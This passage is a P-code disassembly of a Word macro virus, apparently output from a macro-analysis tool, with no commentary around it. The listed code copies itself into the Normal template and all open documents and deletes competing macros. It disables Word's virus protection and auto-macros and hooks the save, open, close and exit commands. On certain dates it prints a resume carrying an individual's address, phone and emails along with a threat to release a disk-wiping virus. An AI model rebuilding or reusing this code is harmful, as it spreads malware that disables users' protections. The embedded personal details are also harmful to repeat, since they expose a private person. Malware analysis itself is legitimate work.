' 	Ld itemName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #49:
' 	QuoteRem 0x000C 0x0017 "-----------------------"
' Line #50:
' 	Ld itemName 
' 	St otherVName 
' Line #51:
' 	LitVarSpecial (True)
' 	St otherV 
' Line #52:
' 	GoTo OthersFound 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' Line #57:
' 	Label OthersFound 
' Line #58:
' 	Ld otherV 
' 	IfBlock 
' Line #59:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld otherVName 
' 	ParamNamed New 
' 	Ld MyName 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndSub 
' Line #62:
' Line #63:
' 	FuncDefn (Sub InfectFile())
' Line #64:
' 	Dim 
' 	VarDefn NTInfected (As Boolean)
' Line #65:
' 	Dim 
' 	VarDefn ODInfected (As Boolean)
' Line #66:
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #69:
' 	ArgsCall (Call) RestorePrev 0x0000 
' Line #70:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #71:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #72:
' 	Ld ndxMac 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	St itemName 
' Line #73:
' 	Ld itemName 
' 	Ld MyName 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	LitVarSpecial (True)
' 	St NTInfected 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld itemName 
' 	Ld MyName 
' 	Ne 
' 	Ld itemName 
' 	Ld TD 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #77:
' 	LineCont 0x000C 03 00 0C 00 09 00 0C 00 0D 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld itemName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' Line #81:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #82:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #83:
' 	StartWithExpr 
' 	Ld openDoc 
' 	With 
' Line #84:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #85:
' 	Ld ndxMac 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	St itemName 
' Line #86:
' 	Ld itemName 
' 	Ld MyName 
' 	Eq 
' 	IfBlock 
' Line #87:
' 	LitVarSpecial (True)
' 	St ODInfected 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	LineCont 0x0004 09 00 14 00
' 	Ld itemName 
' 	Ld MyName 
' 	Ne 
' 	Ld itemName 
' 	Ld TD 
' 	Ne 
' 	And 
' 	Ld itemName 
' 	Ld RTNorm 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #90:
' 	LineCont 0x000C 03 00 18 00 09 00 18 00 0D 00 18 00
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld itemName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	Ld ODInfected 
' 	Not 
' 	IfBlock 
' Line #94:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld MyName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndWith 
' Line #97:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	NextVar 
' Line #98:
' Line #99:
' 	Ld NTInfected 
' 	Not 
' 	IfBlock 
' Line #100:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld MyName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #101:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub FileNew())
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #107:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Sub FileNewDefault())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #113:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub FilePrintDefault())
' Line #116:
' 	Dim 
' 	VarDefn freeF (As Integer)
' Line #117:
' Line #118:
' 	OnError (Resume Next) 
' Line #119:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Paren 
' 	Ld vbFriday 
' 	Ne 
' 	IfBlock 
' Line #120:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #121:
' 	End 
' Line #122:
' 	EndIfBlock 
' Line #123:
' Line #124:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Gt 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #125:
' 	LitStr 0x0014 "c:\windows\dummy.txt"
' 	Ld vbArchive 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #126:
' 	Ld Friend 
' 	St freeF 
' Line #127:
' 	LitStr 0x0014 "c:\windows\dummy.txt"
' 	ArgsCall Kill 0x0001 
' Line #128:
' 	LitStr 0x0014 "c:\windows\dummy.txt"
' 	Ld freeF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #129:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Resume"
' 	PrintItemNL 
' Line #130:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #131:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Applicant's Name: Michael I. Buen"
' 	PrintItemNL 
' Line #132:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #133:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya, Tanza Cavite"
' 	PrintItemNL 
' Line #134:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "Tel:     (046)505-17-39"
' 	PrintItemNL 
' Line #135:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "Desired Position: Programmer/Technical Writer/Computer Salesman"
' 	PrintItemNL 
' Line #136:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #137:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "Skills: Knows C/C++, Assembly, Pascal, COBOL, Clipper, Foxpro, "
' 	PrintItemNL 
' Line #138:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "        JavaScript, VBScript, Visual Basic, VB for Application "
' 	PrintItemNL 
' Line #139:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "        Programming, Access, Clarion, HTML, Batch File"
' 	PrintItemNL 
' Line #140:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #141:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004C "Applications Expertise: Resource Workshop, Aldus Pagemaker, Adobe Photoshop,"
' 	PrintItemNL 
' Line #142:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "        Lotus Smartsuite, Microangelo, and Of Course Excel and "
' 	PrintItemNL 
' Line #143:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "        Microsoft Word"
' 	PrintItemNL 
' Line #144:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #145:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0045 "Favorite Quote: "The cure for boredom is curiosity, there is no cure "
' 	PrintItemNL 
' Line #146:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "                for curiosity""
' 	PrintItemNL 
' Line #147:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #148:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "With Experiences In: Innodata, SENCOR, VMSCI, GenDiesel"
' 	PrintItemNL 
' Line #149:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #150:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "Without Experiences In: Chowking, J-Sys, Jimac, CBSI, Information Professionals, "
' 	PrintItemNL 
' Line #151:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0050 "                        Midas Kapiti, James Martin + co, Professional Staffers, "
' 	PrintItemNL 
' Line #152:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0042 "                        Ergonomics, Express Telecom, 650 Companies"
' 	PrintItemNL 
' Line #153:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #154:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #155:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "e-mail: mycklangelo@yahoo.com / mycklangelo@hotmail.com"
' 	PrintItemNL 
' Line #156:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "Address: Block 6 Lot 3, Hauskon Homes, Daang Amaya, Tanza Cavite"
' 	PrintItemNL 
' Line #157:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "tel: (046) 505-17-39"
' 	PrintItemNL 
' Line #158:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #159:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "To open my interactive resume type markbuen then highlight it"
' 	PrintItemNL 
' Line #160:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "then open a file, then my interactive resume will pop up"
' 	PrintItemNL 
' Line #161:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #162:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "Warning: If I don't get a stable job by the end of the month"
' 	PrintItemNL 
' Line #163:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "         I will release a third virus that will remove all "
' 	PrintItemNL 
' Line #164:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "         folders in the Primary Hard Disk, or in layman's term"
' 	PrintItemNL 
' Line #165:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "         para ko na ring fi-normat ang Hard Disk Mo"
' 	PrintItemNL 
' Line #166:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #167:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "-- Be a Superlearner, Enroll at AMACConda Computer College"
' 	PrintItemNL 
' Line #168:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #169:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 ""Programming today is a race between software engineers "
' 	PrintItemNL 
' Line #170:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "striving to build bigger and better idiot-proof programs, "
' 	PrintItemNL 
' Line #171:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "and the universe trying to produce bigger and better idiots. "
' 	PrintItemNL 
' Line #172:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "So far the universe is winning.""
' 	PrintItemNL 
' Line #173:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "---Rich Cook"
' 	PrintItemNL 
' Line #174:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #175:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "Sa year 2004 FPJ for President, Noli de Castro for Vice President"
' 	PrintItemNL 
' Line #176:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x000F 
' 	ArgsLd Chr 0x0001 
' 	PrintItemNL 
' Line #177:
' 	Ld freeF 
' 	Sharp 
' 	Close 0x0001 
' Line #178:
' 	LitStr 0x0014 "c:\windows\dummy.txt"
' 	ParamNamed FileName 
' 	Ld Application 
' 	ArgsMemCall PrintOut 0x0001 
' Line #179:
' Line #180:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Paren 
' 	Ld vbFriday 
' 	Ne 
' 	IfBlock 
' Line #181:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #182:
' 	End 
' Line #183:
' 	EndIfBlock 
' Line #184:
' Line #185:
' 	EndIfBlock 
' Line #186:
' Line #187:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #188:
' 	EndSub 
' Line #189:
' Line #190:
' Line #191:
' 	FuncDefn (Sub FileSave())
' Line #192:
' Line #193:
' 	Dim 
' 	VarDefn sfor (As Integer)
' Line #194:
' 	Dim 
' 	VarDefn PauseTime
' 	VarDefn startTime
' Line #195:
' Line #196:
' 	OnError (Resume Next) 
' Line #197:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #198:
' 	Ld Selection 
' 	MemLd Then 
' 	Ld ToLove 
' 	Eq 
' 	IfBlock 
' Line #199:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #200:
' 	End 
' Line #201:
' 	EndIfBlock 
' Line #202:
' 	EndIfBlock 
' Line #203:
' Line #204:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #205:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #206:
' 	ArgsCall (Call) ChangeSomething 0x0000 
' Line #207:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #208:
' 	EndIfBlock 
' Line #209:
' Line #210:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Gt 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSaturday 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #211:
' 	StartForVariable 
' 	Ld sfor 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #212:
' 	Ld sfor 
' 	LitStr 0x0001 " "
' 	ArgsLd String$ 0x0002 
' 	LitStr 0x0016 "Michael Learns to Hack"
' 	Concat 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #213:
' 	LitR8 0x0000 0x0000 0x0000 0x3F90 
' 	St PauseTime 
' 	QuoteRem 0x0024 0x000E " Set duration."
' Line #214:
' 	Ld Timer 
' 	St startTime 
' 	QuoteRem 0x0024 0x0010 " Set start time."
' Line #215:
' 	Ld Timer 
' 	Ld startTime 
' 	Ld PauseTime 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #216:
' 	ArgsCall DoEvents 0x0000 
' 	QuoteRem 0x0024 0x001A " Yield to other processes."
' Line #217:
' 	Loop 
' Line #218:
' Line #219:
' 	ArgsCall DoEvents 0x0000 
' Line #220:
' 	StartForVariable 
' 	Ld sfor 
' 	EndForVariable 
' 	NextVar 
' Line #221:
' 	LitStr 0x0021 "And Hope You'll Learn from It Too"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #222:
' 	QuoteRem 0x0004 0x001A "ElseIf Day(Date) = 29 Then"
' Line #223:
' 	QuoteRem 0x0004 0x0016 "    'Show inside story"
' Line #224:
' 	EndIfBlock 
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' 	EndSub 
' Line #229:
' 	FuncDefn (Sub FileSaveAs())
' Line #230:
' 	OnError (Resume Next) 
' Line #231:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #232:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #233:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #234:
' 	EndIfBlock 
' Line #235:
' 	EndSub 
' Line #236:
' 	FuncDefn (Sub FileClose())
' Line #237:
' 	OnError (Resume Next) 
' Line #238:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #239:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #240:
' 	EndSub 
' Line #241:
' Line #242:
' 	FuncDefn (Sub FileExit())
' Line #243:
' 	OnError (Resume Next) 
' Line #244:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #245:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #246:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #247:
' 	EndSub 
' Line #248:
' Line #249:
' Line #250:
' 	FuncDefn (Sub FileOpen())
' Line #251:
' 	Dim 
' 	VarDefn resBalMess (As Balloon)
' Line #252:
' 	Dim 
' 	VarDefn resBal (As Balloon)
' Line #253:
' 	Dim 
' 	VarDefn resBal2 (As Balloon)
' 	QuoteRem 0x001C 0x0004 "back"
' Line #254:
' Line #255:
' 	Dim 
' 	VarDefn resOpt (As Long)
' Line #256:
' Line #257:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn resmSchooling
' Line #258:
' 	Dim (Const) 
' 	LitDI2 0x0002 
' 	VarDefn resmSkills
' Line #259:
' 	Dim (Const) 
' 	LitDI2 0x0003 
' 	VarDefn resmJobExperiences
' Line #260:
' 	Dim (Const) 
' 	LitDI2 0x0004 
' 	VarDefn resmPersonalBackground
' Line #261:
' 	Dim (Const) 
' 	LitDI2 0x0005 
' 	VarDefn resmPersonalForeground
' Line #262:
' Line #263:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn resmCharRef
' Line #264:
' 	Dim (Const) 
' 	LitDI2 0x0002 
' 	VarDefn resmQuote
' Line #265:
' 	Dim (Const) 
' 	LitDI2 0x0003 
' 	VarDefn resmInsideStory
' Line #266:
' Line #267:
' 	Dim (Const) 
' 	LitDI2 0x000C 
' 	UMi 
' 	VarDefn butClose
' Line #268:
' 	Dim (Const) 
' 	LitDI2 0x0005 
' 	UMi 
' 	VarDefn butBack
' Line #269:
' 	Dim (Const) 
' 	LitDI2 0x0006 
' 	UMi 
' 	VarDefn butNext
' Line #270:
' Line #271:
' 	Dim 
' 	VarDefn nl (As String)
' Line #272:
' Line #273:
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	St nl 
' Line #274:
' Line #275:
' 	OnError (Resume Next) 
' Line #276:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #277:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #278:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #279:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #280:
' 	QuoteRem 0x0008 0x0013 "ActiveDocument.Save"
' Line #281:
' 	EndIfBlock 
' Line #282:
' Line #283:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #284:
' 	Ld Selection 
' 	MemLd Then 
' 	LitStr 0x0008 "markbuen"
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #285:
' 	QuoteRem 0x000C 0x0010 " put resume here"
' Line #286:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set resBalMess 
' Line #287:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set resBal 
' Line #288:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set resBal2 
' Line #289:
' Line #290:
' 	Do 
' Line #291:
' 	Ld msoAnimationListensToComputer 
' 	Ld resBal 
' 	MemSt Animation 
' Line #292:
' 	LitStr 0x0019 "Michael Learns To Hack..."
' 	Ld resBal 
' 	MemSt Heading 
' Line #293:
' 	LineCont 0x0008 0A 00 1E 00 12 00 1E 00
' 	LitStr 0x0012 "iNTERACTIVE rESUME"
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0012 "Desired Position: "
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0033 "  Programmer / Technical Writer / Computer Salesman"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0033 " - - - - - - - - - - - - - - - - - - - - - - - - - "
' 	Concat 
' 	Ld resBal 
' 	MemSt Then 
' Line #294:
' Line #295:
' 	LitStr 0x000C "My Schooling"
' 	Ld resmSchooling 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #296:
' 	LitStr 0x0009 "My Skills"
' 	Ld resmSkills 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #297:
' 	LitStr 0x000F "Job Experiences"
' 	Ld resmJobExperiences 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #298:
' 	LitStr 0x0013 "Personal Background"
' 	Ld resmPersonalBackground 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #299:
' 	LitStr 0x0013 "Personal Foreground"
' 	Ld resmPersonalForeground 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #300:
' 	Ld msoButtonSetNextClose 
' 	Ld resBal 
' 	MemSt Button 
' Line #301:
' 	Ld resBal 
' 	MemLd Show 
' 	St resOpt 
' Line #302:
' 	Ld resOpt 
' 	SelectCase 
' Line #303:
' 	Ld resmSchooling 
' 	Case 
' 	CaseDone 
' Line #304:
' 	Ld msoAnimationWritingNotingSomething 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #305:
' 	LitStr 0x000C "My Schooling"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #306:
' 	LitDI2 0x0000 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #307:
' 	LineCont 0x0014 08 00 2A 00 0E 00 2A 00 12 00 2A 00 18 00 2A 00 1C 00 2A 00
' 	LitStr 0x000A "Elementary"
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0022 "   Pio del Pilar Elementary School"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x000B "High School"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0022 "   Philippine Christian University"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0007 "College"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x001D "   AMACConda Computer College"
' 	Concat 
' 	Ld resBalMess 
' 	MemSt Then 
' Line #308:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #309:
' Line #310:
' 	Ld resmSkills 
' 	Case 
' 	CaseDone 
' Line #311:
' 	Ld msoAnimationGetTechy 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #312:
' 	LitStr 0x0009 "My Skills"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #313:
' 	LineCont 0x0004 0A 00 2A 00
' 	LitStr 0x009B "   Proficient with varius languages like C/C++, Assembly, Pascal, COBOL, Foxpro, SQL, Visual Basic, Clarion, JavaScript, VB for Application, VBScript, HTML"
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x00B5 "   Proficient in Application Softwares like Adobe Photoshop, Resourcce Workshop, Microangelo, Lotus Smart Suite, Aldus Pagemaker, Frontpage, Powerpoint, and of course Word and Excel"
' 	Concat 
' 	Ld resBalMess 
' 	MemSt Then 
' Line #314:
' 	LitDI2 0x0000 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #315:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #316:
' Line #317:
' 	Ld resmJobExperiences 
' 	Case 
' 	CaseDone 
' Line #318:
' Line #319:
' 	Ld msoAnimationWorkingAtSomething 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #320:
' 	LitStr 0x000B "Experiences"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #321:
' 	Ld msoBalloonTypeBullets 
' 	Ld resBalMess 
' 	MemSt BalloonType 
' Line #322:
' Line #323:
' 	LitStr 0x0000 ""
' 	Ld resBalMess 
' 	MemSt Then 
' Line #324:
' 	LitDI2 0x0004 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #325:
' 	LitStr 0x002C "INNODATA -- Typereader (corrects OCR errors)"
' 	LitDI2 0x0001 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #326:
' 	LitStr 0x0011 "SENCOR -- Encoder"
' 	LitDI2 0x0002 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #327:
' 	LitStr 0x0022 "VMSCI -- Pseudo Programmer Trainee"
' 	LitDI2 0x0003 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #328:
' 	LitStr 0x001A "GenDiesel -- Super Encoder"
' 	LitDI2 0x0004 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #329:
' Line #330:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #331:
' Line #332:
' 	Ld resmPersonalBackground 
' 	Case 
' 	CaseDone 
' Line #333:
' 	Ld msoAnimationCharacterSuccessMajor 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #334:
' Line #335:
' 	LitStr 0x0013 "Personal Background"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #336:
' 	Ld msoBalloonTypeBullets 
